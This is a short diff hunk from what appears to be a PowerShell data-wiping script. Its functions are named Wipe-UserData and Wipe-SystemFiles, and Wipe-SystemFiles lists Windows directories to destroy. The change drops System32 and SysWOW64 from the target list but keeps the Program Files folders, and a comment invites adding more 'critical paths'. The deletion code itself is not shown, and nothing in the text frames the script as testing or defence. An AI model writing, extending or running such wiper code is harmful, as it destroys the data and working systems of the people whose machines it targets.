@@ -17,9 +17,7 @@ function Wipe-UserData {
 function Wipe-SystemFiles {
     $criticalPaths = @(
         "C:\Program Files",
-        "C:\Program Files (x86)",
-        "C:\Windows\System32",
-        "C:\Windows\SysWOW64"
+        "C:\Program Files (x86)"
         # Add other critical paths as necessary
     )
 
